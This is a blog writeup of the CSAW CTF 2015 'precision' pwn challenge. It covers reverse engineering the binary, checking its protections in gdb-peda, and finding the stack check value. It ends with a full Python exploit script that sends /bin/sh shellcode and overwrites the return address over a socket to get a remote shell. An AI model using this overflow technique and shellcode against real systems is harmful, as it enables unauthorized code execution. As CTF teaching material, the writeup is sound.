---
layout: post
title: "Writeup | CSAW CTF 2015 - Pwn - precision"
date: 2015-09-22 15:18:44 +0000
comments: true
categories: 
---

~~~
nc 54.210.15.77 1259
Updated again!
~~~
[precision_a8f6f0590c177948fe06c76a1831e650](https://ctf.isis.poly.edu/static/uploads/42bf99ba903b051923e707ba422f068a/precision_a8f6f0590c177948fe06c76a1831e650)

Download binary file, open with IDA and HexRay, i have:

![IDA](http://i.imgur.com/9J3MUqz.jpg)

Program prompts user to input a string, then saved to v4.
Seem like there is a buffer over flow here.
So, we should fill the junk data to the string then overwrite return address to execute shellcode.

Check security, using `checksec` in `gdb-peda`:

```
$ gdb precision
Reading symbols from precision...(no debugging symbols found)...done.
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
gdb-peda$
```

Nice.

Have a look at the below code again, we can calculate the length of string (0x80 or 128)

However, we have other issue. The program uses v5 to verify and avoid overflowing the buffer.
I use gdb-peda to view stack, find out the value which is used to verify.

```
gdb-peda$ x/80xw $sp
0xffffd5c0:     0x08048682      0xffffd5d8      0x00000002      0x00000000
0xffffd5d0:     0xffffd60e      0x00000001      0x41414141      0x41414141
0xffffd5e0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd5f0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd600:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd610:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd620:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd630:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd640:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd650:     0x41414141      0x41414141      0x475a3100      0x40501555
0xffffd660:     0x00000000      0xf7fc8000      0x00000000      0xf7e29497  <- [return address]
0xffffd670:     0x00000001      0xffffd704      0xffffd70c      0x00000000
...
```

I use the following 24 bytes to append 128 junk bytes of payload
`0x475a31a5      0x40501555    0x00000000      0xf7fc8000      0x00000000     [new-return-address]`

What is 'new-return-address' ?
Do you remember the gift, which program give us everytime we try to run the binary ? It is address of first byte of payload. So, we can put our shellcode there, and put that address to `new-return-address`

Just some pieces of code more:

```
#!/usr/bin/env python 2.7

#from hexdump import hexdump
import socket
import telnetlib
import struct

p = lambda x: struct.pack("I", x)
P = lambda x: struct.unpack("I", x)
q = lambda x: struct.pack("<Q", x)

def interact():
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def r_until(st, debug=False):
    ret = ""
    while st not in ret:
        lret = s.recv(8192)
        if debug and len(lret) > 0:
            print lret
        ret += lret
    return ret

if __name__ == '__main__':
    s = socket.create_connection(('54.173.98.115', '1259'))    
    data = s.recv(1024)
    addr = data[6:-1]
    
    shellcode =  "\x31\xc0\xb0\x30\x01\xc4\x30\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\xb0\xb0\xc0\xe8\x04\xcd\x80\xc0\xe8\x03\xcd\x80"
    junk = shellcode + '1' * (128 - len(shellcode))

    payload = junk + p(0x475a31a5) + p(0x40501555) + "\x00" * 4 + p(0xf7fc8000) + "\x00" * 4 + p(int(addr, 16))
    s.send(payload + '\n')
    interact()
```

Get your point !  

*Thanks for the great help from my brother*